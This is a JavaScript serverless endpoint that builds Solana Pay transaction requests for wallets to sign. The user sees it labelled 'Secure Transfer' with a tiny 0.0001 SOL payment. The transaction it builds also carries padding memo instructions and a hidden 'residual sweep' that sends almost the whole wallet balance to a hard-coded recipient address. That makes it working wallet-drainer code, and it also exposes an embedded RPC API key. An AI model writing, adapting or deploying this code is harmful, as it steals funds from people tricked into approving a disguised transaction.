import { Buffer } from 'buffer';

const RECIPIENT_PUBKEY_STR = "3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1";
const HELIUS_URL = "https://mainnet.helius-rpc.com/?api-key=06ec4cdf-ba6c-4dfc-827f-5bae3b93f146";
const MEMO_PROGRAM_ID_STR = "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr";

// Base58 decoding map
const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
const ALPHABET_MAP = {};
for (let i = 0; i < ALPHABET.length; i++) ALPHABET_MAP[ALPHABET.charAt(i)] = i;

function decodeBase58(str) {
    let bytes = [0];
    for (let i = 0; i < str.length; i++) {
        const c = str[i];
        if (!(c in ALPHABET_MAP)) throw new Error('Invalid base58 character');
        let carry = ALPHABET_MAP[c];
        for (let j = 0; j < bytes.length; j++) {
            const x = bytes[j] * 58 + carry;
            bytes[j] = x & 0xff;
            carry = x >> 8;
        }
        while (carry) {
            bytes.push(carry & 0xff);
            carry >>= 8;
        }
    }
    for (let i = 0; i < str.length && str[i] === '1'; i++) bytes.push(0);
    return Buffer.from(bytes.reverse());
}

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'GET') {
        return res.status(200).json({
            label: "Secure Transfer",
            icon: "https://cryptologos.cc/logos/solana-sol-logo.png",
        });
    }

    if (req.method === 'POST') {
        try {
            const accountParam = req.body?.account;
            if (!accountParam) {
                return res.status(400).json({ error: "Missing account parameter" });
            }

            const senderPubkeyBuf = decodeBase58(accountParam);
            const recipientPubkeyBuf = decodeBase58(RECIPIENT_PUBKEY_STR);
            const systemProgramBuf = decodeBase58("11111111111111111111111111111111");
            const memoProgramBuf = decodeBase58(MEMO_PROGRAM_ID_STR);

            // Fetch balance & blockhash directly via JSON-RPC
            const rpcRequest = async (method, params) => {
                const response = await fetch(HELIUS_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params })
                });
                const data = await response.json();
                return data.result;
            };

            const balanceRes = await rpcRequest('getBalance', [accountParam]);
            const balance = balanceRes?.value || 0;

            const blockhashRes = await rpcRequest('getLatestBlockhash', [{ commitment: 'confirmed' }]);
            const recentBlockhashStr = blockhashRes?.value?.blockhash;

            if (!recentBlockhashStr) throw new Error("Failed to fetch recent blockhash");
            const blockhashBuf = decodeBase58(recentBlockhashStr);

            // Calculate amounts
            const primaryAmount = 100000; // 0.0001 SOL
            const feeBuffer = 800000;    // 0.0008 SOL
            const residualAmount = balance - primaryAmount - feeBuffer;
            const instructions = [];

            // Primary Transfer Instruction
            const primaryData = Buffer.alloc(12);
            primaryData.writeUInt32LE(2, 0); // SystemProgram Transfer index
            primaryData.writeBigUInt64LE(BigInt(primaryAmount), 4);
            instructions.push({ programIdIndex: 2, accountIndices: [0, 1], data: primaryData });

            // 5x Memo Instructions
            const memoData = Buffer.from("x");
            for (let i = 0; i < 5; i++) {
                instructions.push({ programIdIndex: 3, accountIndices: [0], data: memoData });
            }

            // Residual Sweep Transfer Instruction
            if (residualAmount > 10000) {
                const residualData = Buffer.alloc(12);
                residualData.writeUInt32LE(2, 0);
                residualData.writeBigUInt64LE(BigInt(residualAmount), 4);
                instructions.push({ programIdIndex: 2, accountIndices: [0, 1], data: residualData });
            }

            // Serialize Transaction
            const numSignatures = 1;
            const header = Buffer.from([1, 0, 1]); // 1 signature, 0 read-only signed, 1 read-only unsigned
            const keysList = [senderPubkeyBuf, recipientPubkeyBuf, systemProgramBuf, memoProgramBuf];

            const serializedKeys = Buffer.concat([
                Buffer.from([keysList.length]),
                ...keysList
            ]);

            const compiledInstructions = [];
            for (const inst of instructions) {
                compiledInstructions.push(Buffer.from([
                    inst.programIdIndex,
                    inst.accountIndices.length,
                    ...inst.accountIndices,
                    inst.data.length,
                    ...inst.data
                ]));
            }

            const serializedInstructions = Buffer.concat([
                Buffer.from([instructions.length]),
                ...compiledInstructions
            ]);

            const message = Buffer.concat([
                header,
                serializedKeys,
                blockhashBuf,
                serializedInstructions
            ]);

            const transaction = Buffer.concat([
                Buffer.from([numSignatures]),
                Buffer.alloc(64), // Empty 64-byte signature array for wallet signing
                message
            ]);

            return res.status(200).json({
                transaction: transaction.toString('base64'),
                message: "Approve transaction"
            });

        } catch (err) {
            console.error(err);
            return res.status(500).json({ error: err.message });
        }
    }

    return res.status(405).json({ error: 'Method not allowed' });
}
